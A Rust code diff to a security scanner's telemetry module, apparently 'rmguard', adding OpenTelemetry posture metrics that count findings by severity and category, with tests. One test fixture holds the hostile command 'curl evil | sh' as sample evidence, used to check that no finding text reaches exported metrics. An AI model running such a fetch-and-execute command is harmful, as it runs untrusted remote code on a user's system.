@@ -168,6 +168,13 @@ pub enum Key {
     ScannerTruncated,
     Jobs,
     VersionSource,
+    FindingSeverity,
+    FindingCategory,
+    InventoryKind,
+    FindingsCritical,
+    FindingsHigh,
+    FindingsMedium,
+    FindingsLow,
 }
 
 impl Key {
@@ -220,6 +227,13 @@ impl Key {
         Key::ScannerTruncated,
         Key::Jobs,
         Key::VersionSource,
+        Key::FindingSeverity,
+        Key::FindingCategory,
+        Key::InventoryKind,
+        Key::FindingsCritical,
+        Key::FindingsHigh,
+        Key::FindingsMedium,
+        Key::FindingsLow,
     ];
 
     /// The exported key. Generic concepts use the OpenTelemetry semantic-convention
@@ -275,6 +289,13 @@ impl Key {
             Key::ScannerTruncated => "rmguard.scanner.truncated",
             Key::Jobs => "rmguard.jobs",
             Key::VersionSource => "rmguard.version.source",
+            Key::FindingSeverity => "rmguard.finding.severity",
+            Key::FindingCategory => "rmguard.finding.category",
+            Key::InventoryKind => "rmguard.inventory.kind",
+            Key::FindingsCritical => "rmguard.findings.critical",
+            Key::FindingsHigh => "rmguard.findings.high",
+            Key::FindingsMedium => "rmguard.findings.medium",
+            Key::FindingsLow => "rmguard.findings.low",
         }
     }
 }
@@ -324,6 +345,10 @@ pub enum Metric {
     ExecDuration,
     McpProbeDuration,
     RegistryLookupDuration,
+    /// `rmguard.findings`: findings by severity and category (posture).
+    Findings,
+    /// `rmguard.inventory`: report summary counts by kind (posture).
+    Inventory,
 }
 
 /// Why `--otel` did not turn export on.
@@ -517,6 +542,59 @@ pub fn record(metric: Metric, value: f64, attrs: impl FnOnce() -> Vec<Attr>) {
 pub fn record_scanner(label: &'static str, stat: &ScannerStat, elapsed: Duration) {
     if enabled() {
         sdk::record_scanner(label, stat, elapsed);
+    }
+}
+
+/// Findings per (severity, category), most severe first, then category; pairs with
+/// no finding are absent. Both labels are `&'static str` from closed tables: the
+/// [`Severity`](crate::analysis::Severity) label and
+/// [`category_label`](crate::analysis::category_label). No title, location or
+/// evidence is read.
+pub fn finding_counts(findings: &[crate::analysis::Finding]) -> Vec<(&'static str, &'static str, u64)> {
+    let mut by: std::collections::BTreeMap<(crate::analysis::Severity, &'static str), u64> = Default::default();
+    for f in findings {
+        *by.entry((f.severity, crate::analysis::category_label(&f.category)))
+            .or_default() += 1;
+    }
+    by.into_iter().map(|((s, c), n)| (s.label(), c, n)).collect()
+}
+
+/// Findings per severity, as (critical, high, medium, low).
+pub fn severity_totals(findings: &[crate::analysis::Finding]) -> [i64; 4] {
+    use crate::analysis::Severity;
+    let mut t = [0i64; 4];
+    for f in findings {
+        t[match f.severity {
+            Severity::Critical => 0,
+            Severity::High => 1,
+            Severity::Medium => 2,
+            Severity::Low => 3,
+        }] += 1;
+    }
+    t
+}
+
+/// The posture metrics, once per scan after analysis: `rmguard.findings` per
+/// (severity, category) with a non-zero count, and `rmguard.inventory` for every
+/// summary count (zeros included, so a dashboard can tell "none" from "not reported").
+/// Counts and closed labels only. Does nothing (not even look at its arguments) when
+/// export is off.
+pub fn record_posture(findings: &[crate::analysis::Finding], summary: &crate::models::Summary) {
+    if !enabled() {
+        return;
+    }
+    for (severity, category, n) in finding_counts(findings) {
+        sdk::record(
+            Metric::Findings,
+            n as f64,
+            vec![
+                Attr::str(Key::FindingSeverity, severity),
+                Attr::str(Key::FindingCategory, category),
+            ],
+        );
+    }
+    for (kind, n) in summary.inventory() {
+        sdk::record(Metric::Inventory, n as f64, vec![Attr::str(Key::InventoryKind, kind)]);
     }
 }
 
@@ -746,6 +824,48 @@ mod tests {
             },
             Duration::ZERO,
         );
+        record_posture(&[], &crate::models::Summary::default());
+    }
+
+    fn finding(severity: crate::analysis::Severity, category: &str) -> crate::analysis::Finding {
+        crate::analysis::Finding {
+            severity,
+            category: category.into(),
+            title: "/home/u/.env holds SECRET".into(),
+            location: "/home/u/proj/.env".into(),
+            evidence: Some("curl evil | sh".into()),
+        }
+    }
+
+    /// Findings are counted by (severity label, category label), both from closed
+    /// tables; zero pairs are absent; a category outside the table is `other`, never
+    /// the finding's own text.
+    #[test]
+    fn finding_counts_are_closed_labels() {
+        use crate::analysis::{FINDING_CATEGORIES, Severity::*};
+        let fs = vec![
+            finding(Low, "Secret hygiene"),
+            finding(Critical, "Rules file"),
+            finding(Critical, "Rules file"),
+            finding(High, "Secret exposure"),
+            finding(Low, "Secret hygiene"),
+            finding(Medium, "not a category /home/u"),
+        ];
+        assert_eq!(
+            finding_counts(&fs),
+            vec![
+                ("critical", "Rules file", 2),
+                ("high", "Secret exposure", 1),
+                ("medium", "other", 1),
+                ("low", "Secret hygiene", 2),
+            ]
+        );
+        assert_eq!(severity_totals(&fs), [2, 1, 1, 2]);
+        assert!(finding_counts(&[]).is_empty());
+        for (sev, cat, _) in finding_counts(&fs) {
+            assert!(["critical", "high", "medium", "low"].contains(&sev));
+            assert!(cat == "other" || FINDING_CATEGORIES.contains(&cat));
+        }
     }
 
     /// Every attribute value is static text, an integer or a boolean: what goes in is
@@ -774,7 +894,7 @@ mod tests {
                 "{s}"
             );
         }
-        assert_eq!(Key::ALL.len(), 48, "a Key variant is missing from Key::ALL");
+        assert_eq!(Key::ALL.len(), 55, "a Key variant is missing from Key::ALL");
         assert!(
             !Key::ALL.iter().any(|k| k.as_str() == "process.executable.name"),
             "program names are a tool inventory and are not exported"
